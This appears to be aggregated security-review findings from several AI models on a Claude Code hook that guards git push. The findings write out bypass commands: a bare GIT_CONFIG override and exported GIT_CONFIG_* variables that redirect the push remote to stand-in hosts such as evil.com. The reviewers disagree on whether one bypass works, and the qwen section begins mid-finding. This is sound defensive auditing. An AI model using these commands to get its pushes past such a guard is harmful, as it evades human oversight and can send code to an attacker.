=== FINDINGS FROM deepseek_deepseek-v4-pro ===
- .claude/hooks/pr_merge_status_guard.py:362 | severity=high | confidence=5
  PROBLEM: The guard checks `name.startswith("GIT_CONFIG_")` to detect Git configuration overrides, but this pattern does not match the legacy `GIT_CONFIG` environment variable that Git accepts for pointing to a custom configuration file.
  WHY: `GIT_CONFIG=/tmp/evil git push origin HEAD:feature/x` passes the assignment scan, so `config_override` stays False; the guard then authorizes the push using the checkout's origin PR history while Git uses the overridden configuration file to redirect the push destination. The same gap exists in the workflow-template copy at line 362.
- .claude/hooks/pr_merge_status_guard.py:353-363, 1323-1326 | severity=low | confidence=4
  PROBLEM: The guard detects `GIT_CONFIG_*` overrides only when they appear as inline prefix assignments before `git` in the same simple-command segment.
  WHY: An earlier `export GIT_CONFIG_COUNT=1; export GIT_CONFIG_KEY_0=remote.origin.url; export GIT_CONFIG_VALUE_0=https://evil/repo;` followed by a separate `git push origin HEAD` segment carries those variables in the shell process, but the guard sees no inline prefix on the git segment. This is a pre-existing design limitation of segment-isolated evaluation, not newly introduced.

=== FINDINGS FROM minimax_minimax-m3 ===
- Requirement: "Pushes with per-command Git configuration (`git -c` or `--config-env`) also ask: an override can redirect `origin`, so the guard does not use its stored PR history. The same confirmation applies to inline `GIT_CONFIG_*` assignments before `git push`.
  Expected change site: `.claude/hooks/pr_merge_status_guard.py:362-363` and `workflow-templates/.claude/hooks/pr_merge_status_guard.py:362-363`
  Evidence of absence: The check at `name.startswith("GIT_CONFIG_")` requires a trailing underscore, so the bare `GIT_CONFIG` env var (the one accepted by `git config --file`) is technically not matched. However, per git's documented behavior, `GIT_CONFIG` is only consulted by `git config --file` and does not affect config loaded for `git push` (the security-relevant env vars for `git push` are `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_COUNT`/`_KEY_0`/`_VALUE_0`, `GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_NOSYSTEM`, all of which have the `GIT_CONFIG_` prefix and are caught). The PR description scopes the guard to "inline `GIT_CONFIG_*` assignments" and to config that "may redirect `origin`" — the bare `GIT_CONFIG` env var cannot redirect the push destination, so this is consistent with the documented intent.
  Severity: low
  Confidence: 2
- Requirement: "every Codex agent that reads untrusted text runs in a credential-free, network-isolated container" with the "no switch that turns isolation off" property.
  Expected change site: The cross-pollination review flagged an `export GIT_CONFIG_*=...; git push ...` pattern that could redirect a push to a different origin (not the checkout's origin) while the guard checks the checkout's origin PR history. The LAST RUN DIFF only added the inline-prefix form (`GIT_CONFIG_*=... git push ...`); an `export` statement in an earlier command segment is not tracked.
  Evidence of absence: Looking at `_shell_segments_with_operators` and `_guarded_git_invocations` (lines 262-416), shell segments are split on `;`/`&&`/`||`/`|`, and each segment's `environment` dict is built only from inline assignment prefixes in that same segment. An `export GIT_CONFIG_PARAMETERS='remote.origin.url=https://github.com/other/repo'` in one segment followed by `git push ...` in the next would not set `config_override = True`, so the guard would not fire the ask at line 1324. The PR description and the LAST RUN DIFF's documentation update both explicitly scope the guard to "inline `GIT_CONFIG_*` assignments before `git push`" (per the diff at `README.md:1232` and the LAST RUN DIFF's changelog/changelog.d edit) — the `export` form is not a deliverable of this PR. This is a pre-existing architectural limitation of the guard's design (which only inspects assignment prefixes, not prior shell state) and the LAST RUN DIFF does not regress it; the LAST RUN DIFF's fix actually improves the inline-prefix path that was previously dead (the `config_override = False` was being re-set inside the option loop). Tracking shell state across command segments is a significant architectural change that is out of scope.
  Severity: low
  Confidence: 3
=== END FINDINGS FROM minimax_minimax-m3 ===

=== FINDINGS FROM openai_gpt-6-luna ===
- .claude/hooks/pr_merge_status_guard.py and workflow-templates/.claude/hooks/pr_merge_status_guard.py: `_guarded_git_invocations`, lines 362–363 | severity=high | confidence=4
  PROBLEM: The guard flags configuration overrides only when the variable name starts with `GIT_CONFIG_`; it does not flag the legacy `GIT_CONFIG` variable.
  WHY: A command such as `GIT_CONFIG=/tmp/redirected-config git push origin HEAD:feature/x` can make Git use a different push destination, while the guard checks PR history using the checkout’s original `origin` and may allow the push.
- .claude/hooks/pr_merge_status_guard.py and workflow-templates/.claude/hooks/pr_merge_status_guard.py: `_guarded_git_invocations`, lines 329–366; `_evaluate_bash`, lines 1323–1326 | severity=high | confidence=5
  PROBLEM: The guard detects `GIT_CONFIG_*` assignments only when they prefix the same `git` command. It does not retain environment changes from earlier shell segments, such as `export`.
  WHY: In `export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/other/repo; git push origin HEAD:feature/x`, the export segment is ignored and the later push is checked against the checkout’s `origin`. Git inherits the exported override and can push to another repository without the guard requesting confirmation.
=== END FINDINGS FROM openai_gpt-6-luna ===

=== FINDINGS FROM qwen_qwen3_7-plus ===

  WHY: A command like `GIT_CONFIG=/tmp/evil-config git push origin HEAD:feature/x` would pass the guard without setting `config_override = True`, so the push would be authorized against origin's PR history while Git reads the attacker-controlled config file.
- .claude/hooks/pr_merge_status_guard.py (and workflow-templates/.claude/hooks/pr_merge_status_guard.py): lines 353-366 (assignment-prefix scan) and lines 1323-1326 (per-invocation evaluation) | severity=high | confidence=3
  PROBLEM: The guard detects `GIT_CONFIG_*` overrides only when they appear as assignment prefixes on the same simple command as `git`. It does not carry environment changes from earlier segments in the Bash payload.
  WHY: A multi-line command such as `export GIT_CONFIG_COUNT=1\nexport GIT_CONFIG_KEY_0=remote.origin.url\nexport GIT_CONFIG_VALUE_0=https://evil.com/repo\ngit push origin HEAD:feature` is split into four segments; the export segments are skipped, and the later push is authorized against origin's PR history while Git uses the exported overrides.

=== END FINDINGS FROM qwen_qwen3_7-plus ===
